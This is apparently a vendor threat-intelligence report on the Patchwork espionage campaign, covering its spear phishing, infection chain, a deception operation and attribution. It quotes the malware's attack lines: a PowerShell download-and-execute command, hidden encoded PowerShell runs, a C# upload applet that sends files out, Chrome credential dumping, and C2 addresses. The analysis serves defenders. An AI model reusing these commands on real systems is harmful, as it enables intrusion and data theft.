There are indications of activity as early as 2014 , but Cymmetria has  not observed any such activity first hand .  Patchwork targets were chosen worldwide with a focus on personnel working on military and  political assignments, and specifically those working on issues relating to Southeast Asia and the  South China Sea. Many of the targets were governments and government -related organizations .  What makes this report special is that Patchwork is the first targeted threat captured using a  commercial deception product. Through the use of deception campaigns created with  Cymmetria’s MazeRunner, we were able to catch the threat actor’s second stage toolset, as well  as lateral movement activity .                                                      The deception campaign (see “The investigation” section)     EXECUTIVE SUMMARY   The code used by this threat actor is copy - pasted from various online forums, in a way  that reminds us of a patchwork quilt – hence  the name we’ve given the operation .    In active victim systems, Patchwork  immediately searches for and uploads  documents to their C&C, and only if the  target is deemed valuable enough, proceeds  to install a more advanced second stage  malware.     It is impossible to reach clear attribution  from the information available. We have  included an attribution section in this  document to document our research efforts  in this regard.  Attacker operating times that overlap with a  standard 9am-7pm workday (darker means  larger volume)    5   Research  TLP: GREEN      ACKNOWLEDGEMENTS   We would like to acknowledge our colleagues Brandon Levene  at Palo Alto Networks, Kaspersky  Lab’s GReAT  team, and others whom we can’t mention, for their assistance and cooperation .                                                             6   Research  TLP: GREEN   OVERVIEW   The attack was detected as part of a spear phishing against a government organization in Europe  in late May 2016 . The target was an employee working on Chinese policy research and the attack  vector was a PowerPoint presentation file. The content of the presentation was on issues relating  to Chinese activity in the South China Sea.                               Screenshot of the first slide from one of the infected presentations     After the presentation is opened, the vulnerability highlighted by CVE -2014 -4114 is exploited.  This is a well documented vulnerability commonly called Sandworm, which only works on  unpatched versions of Microsoft Office PowerPoint 2003 and 2007 .  Once the exploit worked, it deployed the first stage payload: a compiled AutoIt  script. This script  then bypassed UAC using a known method called UACME, the code for which was taken from an  online forum.                     Screenshot of the AutoIt  malware publication forum post1  _________________   ¹ http ://www.indetectables.net/viewtopic.php?f= 7&t=52263 &sid=b 6fe274a4e8934 fceb 0f3fc90cd35aa2 THE INVESTIGATION   7   Research  TLP: GREEN   With higher privileges, the first stage payload ran PowerSploit  to download code to run a reverse  shell with Meterpreter  – the RAT of the well known MetaSploit  framework.   The next stage was exfiltration of document files that are also used to validate the value of the  infection. If the infected system was deemed valuable enough, the threat actor then infected the  target host with a second stage payload, which was once again a module built from code taken  from various online forums and resources .                            Flowchart of infection stages     Since the threat had already been detected and stopped, our goal was to discover as much as we  could about the threat actor. Specifically, we were interested in tools, techniques, and  procedures (TTPs), so that we would be able to detect the threat in case it succeeded in gaining a  foothold elsewhere in customers’ assets. Learning about the threat actor’s TTPs would also allow  us to prevent the threat actor from launching another operation targeted at our customer, as  well as prevent them from launching similar attacks against other customers in the future.   Our investigation proceeded on two fronts:   1.We built a deception campaign to discover the second stage malware and the actor’s TTPs,  while the operation was still active.   2.We investigated the operation to uncover the threat actor’s capabilities.     HUNTING THE ATTACKER WITH A DECEPTION CAMPAIGN   In order to capture the attacker’s second stage malware (persistence) and observe their pivoting  behavior in the network (lateral movement), we created a realistic environment in which to hunt  the threat actor. We did so by using Cymmetria's MazeRunner solution to deploy a deception  campaign. A deception campaign is essentially a story comprised of breadcrumbs and decoys; it  leads attackers to believe that they have successfully gained access to a target machine.   Breadcrumbs are pieces of data that lead an attacker to another machine; these could be stored  credentials, open shares, browser cookies, VPN configurations, and more. Decoys  are full  operating systems running on virtual machines that act as real and high -value targets for an  attacker; breadcrumbs point to decoys, which are fully monitored for any attacker interaction .    8   Research  TLP: GREEN   The campaign (which can be found on Cymmetria Research’s GitHub ) was built to fit the specific  profile of the active target. MazeRunner captured all the forensic data associated with the threat,  so we knew that the threat actor followed the breadcrumbs and activated all the stages of their  attack. MazeRunner allowed us to see all of the network traffic, operating system changes, and  lateral movement the threat actor performed.   This is the first time, to our knowledge, that an APT (or more aptly, a targeted attack) has been  deceived and captured by a deception solution that caused the threat actor to follow  breadcrumbs and attack decoys , ultimately leading to the disclosure of the operation.                       The deception campaign that caught the APT   GETTING STARTED   As mentioned in the previous section, our first order of business was verifying that the operation  was still active, and then creating a deception campaign around it to catch the second stage  malware and discover and mitigate other TTPs being used by the threat actor. To this end, we  created a target in the form of a profile for a person in whom the threat actor was interested. We  then constructed a deception campaign based on that profile. In this case, the person was a  member of a government think tank dealing with security issues.   A network around the infected endpoint was created using MazeRunner:   •SMB shares were created on decoys, and mapped on the target laptop, to play the part of  network backups.   •Further, RDP credentials were deployed on the laptop to lead to a service running on a decoy  system in the cloud.                       SMB breadcrumb leading to the file server decoy       9   Research  TLP: GREEN                         RDP Breadcrumb that leads to a cloud decoy     CHAIN OF EVENTS   1.The PowerPoint PPS file was opened, which in turn dropped the initial payload components.  The exploit used was CVE -2014 -4114 (Sandworm).                               Driver.inf content   1.     2.The endpoint was infected with the following executables:   •sysvolinfo.exe  – AutoIt  compiled script.   •PowerShell reverse shell HTTPS Meterpreter  script – Was pulled from the C 2 server  and was executed using the following requests:   •212[.]129.13.110 /dropper.php?profile =<base64 of  [username@computername ]>  •hxxps://45[.]43.192.172 :8443/OxGN   3.Files from the target laptop were being uploaded by the threat actor to the control server,  alongside significant activity on the encryption channel. We did not monitor the SSL encrypted  channel, in order to avoid detection in case Meterpreter’s “sstagerverifysslcert ”  option was used .  4.The threat actor decided to drop the second stage malware, 7zip.exe , onto the infected  endpoint. The tool scanned the hard disk, and talked with 212[.]83.191.156 .  5. It copied itself as netvmon.exe  into C:\\Windows\\SysWOW64\\netvmon.exe and added  that path to the startup programs. This is how the threat actor achieves persistence .    10   Research  TLP: GREEN   6.Three days following the initial infection, alerts were received on the decoy running the SMB  shared folder indicating access by the threat actor.   7.The malware accessed the mapped share that was deployed as a breadcrumb on the infected  laptop while scanning all the drives for files. The actual function that caused the alert was  GetDriveTypeA  (which is called to assure that only fixed drives are traversed).   8.After the first alerts in the system were generated, we saw connection attempts to our cloud  decoy via RDP. This decoy’s IP address was placed as an RDP credentials breadcrumb on the  target laptop . The alerts originated from 212[.]129.7.146 , and the entire event lasted for  12 minutes.   9. The alerts we received in MazeRunner  indicated that the attackers failed to log in several  times, which makes us believe that they pulled the RDP connection file (breadcrumb) that was  on the infected desktop. It is interesting to note that they didn’t mine the credentials using  mimikatz  (which would have enabled them to connect to the cloud decoy with ease).   10. We believe this connection was carried out by the same threat actor because:   •The IP they used to connect to our decoy also belongs to rev.poneytelecom.eu .  •The event took place on the same day we received the alerts on our internal system.   This shows that the threat actor was deceived into exfiltrating  data, deploying their second  stage persistence tool, and using the breadcrumbs that we left on the infected laptop.  Furthermore, if they had used mimikatz , they also would have succeeded in connecting to our  cloud decoy and be encouraged to deploy other, later stage tools.                                     Network layout     11   Research  TLP: GREEN   INTELLIGENCE GAINED FROM THE ACTOR’S C&C SERVER   Through one of our partners, we managed to receive access to one of the threat actor’s  command and control servers. The server contained a multitude of additional files:   •An abundance of PPS files – the spear phishing infecting files   •Additional malicious code packages   Most of the spear phishing files’ content2 was directly related to China -related subjects, or  pornographic in nature. Some examples of the spear phishing PPS attachment files used by the  threat actor :                              From the C&C server, we also extracted the dates on which the PPS lures were last modified;  these dates ranged from December 2015 to January 2016 . The dates were grouped together and  then plotted. The resulting graph is a good indication of times at which we believe the attackers  prepared and carried out their attack .                      Number of PPS edits by date   _____________   2 We have no direct proof of this, but information from several partners suggests that stolen documents  are being actively repurposed for spear phishing purposes.      12   Research  TLP: GREEN   TOOLS DEPLOYED   ATTACK VECTOR                         Flowchart of infection stages     The attack vector is a spear phishing email with a PPS file attachment. It utilizes the exploit of  CVE-2014 -4114 (Sandworm). The exploit code closely resembles a public proof of concept exploit  found on exploit -db1³. The exploit enables the attacker to drop files and execute an INF file,  which is a Windows driver descriptor file.     Through the exploit, the attack drops two files that are embedded in an OLE object to the local  machine:   •Driver.inf   •Sysvolinfo.exe                 Driver.inf content     After dropping the files, the exploit executes the INF file by calling the Windows utility  InfDefaultInstall.exe  with the dropped driver.inf  as a parameter.   This causes the execution of the Windows utility RunOnce.exe , which receives the  sysvolinfo.exe  file as a parameter and executes it .  _____________   ³ https ://www.exploit -db.com/exploits/ 35019 /   TECHNICAL ANALYSIS   13   Research  TLP: GREEN   DROPPER   The sysvolinfo.exe  is the first stage payload of the threat actor (another name seen is  uplv1032.exe ). Its purpose is to escalate privileges, exfiltrate  data, and download and execute  an online remote access tool based on PowerSploit ⁴. Through the now installed Meterpreter, the  actor can issue commands to run on the infected machine manually.                       Originally created by an unknown user of “O RLY Cover Generator”5    The sysvolinfo.exe code itself is a compiled AutoIt  script. A significant portion of its code is  copied from the online hacking forum “ Indetectables”6.    C&C COMMUNICATIONS   Once the tool starts, its first action is to connect back to the C&C server and send a beacon,  listening for commands. Below is the analysis of the C&C protocol.   Definitions:    ComputerID  = BASE64ENCODE(“$USERNAME@$COMPUTERNAME”)    ddager = Is startup registry key added (Bool)    r1 = BASE64ENCODE(result of OSVersion  macro, e.g. WIN_ 7)   r2 = BASE64ENCODE(result of OSArch macro, e.g. X 64)   r3 = BASE64ENCODE(trojan version, 1.1 in our sample)    r4 = BASE64ENCODE(Does the SQLite database folder (   @UserProfileDir  &  “\\AppData\\Local\\Google\\Chrome\\User   Data\\Default\\”) exist ( 1) or not ( 0))   r5 = BASE64ENCODE(stdout of last cmd command)    r6 = BASE64ENCODE(1 if running as administrator, 0 if not)  On beacon function call a POST request to:         - hxxp://212[.]129.13.110 /dropper.php?profile= + $ ComputerID     _____________   ⁴ PowerSploit : the PowerShell version of Meterpreter , a popular remote access tool from the MetaSploit   framework .  ⁵ https://dev.to/rly   6 http ://www.indetectables.net/viewtopic.php?f= 7&t=52263 &sid=b 6fe274a4e8934 fceb 0f3fc90cd35aa2  14   Research  TLP: GREEN    Which is sent with the following parameters:   - ddager, r1, r2, r3, r4, r5, r6.   The return value of the request is structured as follows:   - “$sdata|$payload” , where sdata  is the command to run (by id, 1-8), and payload   is the argument for the command .  The available commands are :                                          Functions :  _emorhc($dllurl) – Searches for sqlite3.dll  (or sqlite3_x64.dll  in 64 bit). If not  found, it downloads it from $dllurl . The function then proceeds to close all the “chrome.exe”  processes, dump the login data database @USERPROFILEDIR &  \"\\AppData\\Local\\Google\\Chrome\\User Data \\Default\\Login Data\"  into  C:\\recoveryx \\Protected.ie 2, upload the file, and delete it. Note: the authors forgot to  delete the c:\\recoveryx directory .  _getnewver ($newverurl ) – Deletes itself, downloads a new version from $newverurl , and  executes it. Cmd command :    “cmd.exe /c ping -n 5 127.0.0.1 > nul & del \" & @SCRIPTFULLPATH & \" & ping -n  5 127.0.0.1 > nul & powershell  IEX (New -Object  System.Net.WebClient ).DownloadFile ('\" & $newverurl  & \"', '\" & @SCRIPTFULLPATH  & \"') & \" & @SCRIPTFULLPATH”.    They are using ping between commands for an unknown reason. A possible usage is as a sleep(5). Command ID  Command explanation   “1” The debug print describes the command as \"[+] ServFlag   :  Disabled\" , but the actual code is doing nothing.   “2” If command “ 2” wasn’t called before, then execute a PowerShell script with  the UAC bypass vulnerability: \"powershell  -nop -wind hidden -noni  -enc \" & $PAYLOAD   “3” Reset the inner state of the script to ignore previous execution of command  “2”, thus allowing command “ 2” to execute again.   “4” Exit the script.   “5” Executes _emorhc function with base64decode($payload) as arg (see  below).   “6” Executes _getnewver  function with base64decode($payload)  as arg  (see below).   “7” Executes _instcust  function with base64decode($payload) as arg  (see below).   “8” Executes the cmd command stored in base64 in $payload and saves its   output to r5.        15   Research  TLP: GREEN   _instcust ($custurl) – Downloads a “custom” executable and executes it with the UAC  bypass vulnerability .  _upload($ f_path, $f_name, $repeat, $retry)  – Handles all file upload. It uploads the  file $f_path to hxxp:// 212[.]129.13.110 /update-request.php?profile = +  $ComputerID , with a maximum retry count of 5. The post contains the following data :    \"Content -Disposition: form -data; name=\"\"filename\"\"; filename=\"\"\" &  $f_name & \"|\" & $ f_hash & \"\"\"\" & @CRLF & @CRLF & $ ffile & @CRLF     Where $f_hash is the md5 cheksum of the file to be uploaded, $f_name is the base64  encoding of $f_name , and  $ffile is the content of the file.   After sending beacon to the server, it continues to scan the “Program Files” directories (both x 86  and the standard path) for a directory with the string “Total Security ”⁶ (the installation path of the  “360 Total Security”7 antivirus), and, oddly, proceeds to do nothing with that knowledge.   The payload will install itself in the startup programs folder as \"Baidu Software Update\"  (HKEY_CURRENT_USER \\SOFTWARE \\Microsoft \\Windows\\CurrentVersion \\Run). It then  sends another beacon to the server, after which it starts to recursively go over all of the fixed  drives in the computer and look for files with the following extensions:   •doc  •pdf  •csv  •ppt  •docx   •pst  •xls  •xlsx  •pptx    It then uploads all of the files to the server at:   212[.]129.13.110 /update-request.php?profile =  The decompiled applet which drives this functionality has a very interesting PDB included  “C:\\Users\\Kanishk\\Documents \\Visual Studio  2015\\Projects \\ConsoleApplication 1\\ConsoleApplication 1\\obj\\Debug\\ConsoleA pplication 1.pdb”.              ____________   7 https ://www. 360totalsecurity.com /   16   Research  TLP: GREEN   Applet code included below:   namespace ConsoleApplication 1  {      internal class Program       {          private static void Main(string[] args)          {              try              {                  string fileName  = args[0];                  WebClient  webClient  = new WebClient ();                  webClient.UploadFile (args[1], \"POST\", fileName );              }              catch              {              }          }      }  }    PRIVILEGE ESCALATION   After the previous stages, the payload uses a well known and as -of-yet unpatched UAC bypass  vulnerability in Microsoft Windows (known as UACME8), which works on the default setup of  Windows 79. This allows the attackers to execute commands as Administrator .  If the AutoIt  script is compiled for x 86 systems (/x 86 flag), the payload hides the UAC bypass  vulnerability exploitation inside svchost.exe  using a technique called Process Hollowing10 (UAC  bypass method – ‘IFileOperation  COM Object’11). If the AutoIt  script is compiled for x 64 systems  (/x64 flag), the oobe12 UAC bypass method is used .            ___________   8 https ://github.com/hfiref 0x/UACME   9 According to research, also Windows 8 as claimed by Peter Kleissner ,  https ://download.pureftpd.org/misc/UAC.cpp   10 https ://www.trustwave.com/Resources/SpiderLabs -Blog/Analyzing -Malware -Hollow -Processes   11 https ://www.greyhathacker.net/? p=796  12 http ://www.labofapenetrationtester.com/ 2015 /09/bypassing -uac-with -powershell.html            17   Research  TLP: GREEN   SHELLCODE EXECUTION   When the AutoIt  malware’s heartbeat receives a “ 2” in $sdata (this seems to be the most  common scenario), the included, base 64-encoded response data is decoded and executed using  the command “powershell  -nop -wind hidden -noni -enc”. We observed that the  base 64 encoded payload was a PowerShell script that closely resembled code designed to allow  x86 shellcode  to run on x 64 architectures13. This PowerShell script executed an additional  payload, which was a PowerSploit  script14 used to invoke shellcode  containing a reverse HTTPS  Meterpreter .    REVERSE HTTPS METERPRETER   The AutoIt  script escalates privileges and then executes a PowerShell script that is easily  fingerprinted as a reverse HTTPS Meterpreter . It seems likely that the PowerShell scripts were  copied from an online blog15, and the Meterpreter  payload inside was generated using the  parameters:   •LHOST=45[.]43.192.172   •LPORT=8443                    The process tree of the initial exploit and later payloads     SECOND STAGE PAYLOAD   This tool is only downloaded and installed after the attacker first uses the Meterpreter  and  determines that the target is valuable. We refer to the payload as 7zip.exe , but it can also be  named ndcrypt.ex e and nd.exe .              ___________    13 https ://www.trustedsec.com/may -2013 /native -powershell -x86-shellcode -injection -on-64-bit-platforms /   14 https ://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke -Shellcode.ps 1   15 http ://0entropy.blogspot.com/ 2012 /04/powershell -metasploit -meterpreter -and.html             18   Research  TLP: GREEN                             Hex view of the 7zip.exe memory dump     Most of this payload’s code is based on a public online code project in GitHub16.  Once unpacked, the module performs these actions:   •In order to persist past computer shutdown and power on, the payload copies itself to a  system directory, renames the file to netmon.exe, and adds the executable to the startup  programs as “Net Monitor”:   C:\\Windows\\SysWOW64\\netmon.exe - example of the final destination on 64-bit  system running 7zip.exe/netmon.exe via WOW64  •One thread scans all drive letters and exfiltrates  files with certain extensions in the permanent  drives (not searching network drives or USB).   Note : this is called the GetDriveTypeA  function in kernel32.dll , which caused the alert  on our system.   •Another thread is uploading files of the same formats as from the Dropper payload (see above)  to hxxp://212[.]83.191.156 /http/up.php .  •Another thread downloads an executable from  hxxp://212[.]83.191.156 /http/down.php and executes it. We didn’t observe this  behavior.                  ___________   16 https:// github.com/yorickdewid/MyDoom   19   Research  TLP: GREEN   While we cannot make definitive claims of attribution, we will present evidence that may assist in  later efforts to identify this threat actor.     PREVIOUSLY EXAMINED INFORMATION   Let’s examine the attribution information we have discussed thus far in this report .  Many of the primary targets of this campaign are regional neighbors of India, and other targets  seem to be targeted (by their interests, occupation, and by the content of the spear phishing) to  issues affecting India. Circumstantially, this targeting correlates with intelligence requirements  necessary for a pro -Indian entity .  However, we felt this was not enough to draw direct conclusions. What we believe makes this  correlation much stronger and hints that this is a pro -Indian or Indian entity, is the addition of  time of day activity analysis as detailed below .    PPS EDIT TIME ANALYSIS17  Following a review of the PPS files found on the C&C server, we extracted data concerning the  time of day when each PPS file was last modified, and plotted this on a graph. Below, we can see  that more editing occurred during certain hours of the day.                             Number of edits by time of day      ___________   17 Time zone analysis and research activity associated with daytime hours is circumstantial by definition.  Some threat actors work around the clock, and manipulation of timestamps has been seen in past attacks  by various threat actors. While it should be treated with due suspicion, it has also proven itself highly  valuable in analysis of APT threat actors in the past and cannot be discounted.  ATTRIBUTION   20   Research  TLP: GREEN   Based on modification times of the infecting presentation files, we see two distinct batches of  work. The first, where the bulk of changes has been made, stretches from around 4:00 to 12:00  in coordinated universal time. To visualize what exactly that means, this time range was  considered in the context of a standard 9am - 7pm work day and applied to a map. The “First  stretch of work” label on the map below depicts the areas of the world in which 4:00 - 12:00 UTC  would fall within the standard work day. Similarly, the time zones shaded within the “Second  stretch of work” area are representative of the areas of the world in which 19:00 - 22:00 UTC falls  within the work day. Since the time span of the second stretch of work is smaller in range, the  hours in universal time fall within the working hours of more countries. Based on this map, we  can conclude that it is most likely that the threat actors were based within the blue  areas.                                           Attacker operating times that overlap with a standard 9am-7pm workday (darker means larger  volume)     Many of the conclusions drawn from the above map were also confirmed through other sources.  Extra data we were able to extract and analyze further correlated with this data, as well as with  the previous PPS data.       21   Research  TLP: GREEN   C&C ACTIVITY TIMES   The time at which servers were staged was listed not only by hour, but by day of the week. After  plotting these times by hour, with the day of the week specified through color coordination, we  can see various patterns. It was more common for servers to be staged on certain days of the  week, such as Sunday, rather than on other days, such as Saturday. These times are also  clustered together in a clump for the most part, with almost no activity earlier than 2:00 UTC,  and besides one exception on Sunday, not later than 11:00 UTC. This clump is very similar to the  range of time specified within the first clump of time in the PPS editing graph and the “First  stretch of work” area of the “Threat actor working hours” diagram.                                 Displays the number of times a server was staged by hour of day, color -coordinated by day of  the week     Other data extracted from the server included the time of day and day of the week of domain  registrations. After plotting these on a graph, we observed that domains were registered only on  specific days of the week. The other important feature is that all of these incidents occurred  between 3:00 and 15:00 UTC, which is a slightly wider range than the first stretch of time in the  PPS editing graph, but still very comparable.         22   Research  TLP: GREEN                                   Displays the number of domain registrations by hour of day, color -coordinated by day of the  week     Extra analysis we were able to conduct was on the compilation times, by time of day and day of  the week. After plotting these on a graph, we observed that, similar to domain registrations,  compilations only occurred on specific days of the week. All the events took place between 2:00  and 10:00 UTC, which is only a slight shift of the time span in the first stretch of PPS editing.     23   Research  TLP: GREEN     Displays the number of compilations by hour of day, color -coordinated by day of the week     All three of these graphs provide confirmation that these attacks were clustered partially by day  of the week but mostly by time of day. Specifically, the time of day when staging servers, domain  registration, and compilations occurred most frequently lined up with the first stretch of time  seen in the PPS18 editing data. This applies to the area of the map within the “First stretch of  time” label and adds weight to our conclusion that the threat actors live in the blue area .  This time of day activity data, when combined with the previous circumstantial evidence (the  threat actor’s intelligence requirements, the countries targeted around India, the other targets  around the world, and the content of the spear phishing, directs us to the conclusion that this  threat actor correlates with a location in India .  Carefully, we feel obligated to note that further evidence suggests potential links between this  threat actor and the operations known as Hangover/ Appin , but this possible link is still being  researched and is far from conclusive .  That said, attribution is tricky business and it’s never possible to be entirely conclusive.         ___________   18 Information from several partners suggests that the documents being stolen and then  repurposed for spear phishing purposes also contain language indicators that support our  hypothesis, but we have no direct information to support this.   24   Research  TLP: GREEN   Patchwork is a highly successful targeted attack operation, infecting approximately 2,500 high - value targets worldwide. It is surprising that it has remained undetected since its operations  began in December, as it seems to have been built out of a confluence of code taken from  various public and hidden criminal forums, as well as various open source projects .  What makes this disclosure special is the use of Cymmetria’s cyber deception platform19 to catch  the threat actor, capturing their second stage toolset and lateral movement activity. Without  deception, capturing second -stage tools and activity has previously been difficult (to say the  least ).  The high degree of operational capacity stands in stark contradiction to the low technical ability  displayed, which raises the question of whether the copy -paste nature of the threat was  potentially intentional, perhaps an evolution of threat actors attempting to avoid the high cost of  losing their expensive tool box and malware when they are eventually publically disclosed. This,  however, seems unlikely, as the use of such second -hand code is consistent with their second  stage toolset meant for persistence, which should typically be built to resist detection .  While one can almost never be conclusive in attribution, based on the information we have it is  plausible that the threat actor is a pro -Indian one. As our CEO Gadi Evron said in an internal  discussion, “There is a possibility that another threat actor wanted to look like India and built a  false flag operation to fit, but there is zero evidence to support that claim, and it feels like we’re  reaching just to attack our own argument .”  Unlike other APT threat actors, India seems to be a relatively quiet locale for cyber espionage  activity, if indeed this is a pro -Indian threat actor, it is noteworthy by itself . The scope and scale  of this operation are quite surprising considering the low technical capability displayed, which we  believe is a growing trend seen among disparate  threat actors.                                 ___________   19 Cymmetria’s MazeRunner  CONCLUSIONS  25   Research  TLP: GREEN   All IoCs  (in CSV and STIX formats), and the MazeRunner campaign file, can be found on  Cymmetria research’s GitHub, at: https ://github.com/CymmetriaResearch/CymmetriaResearch .
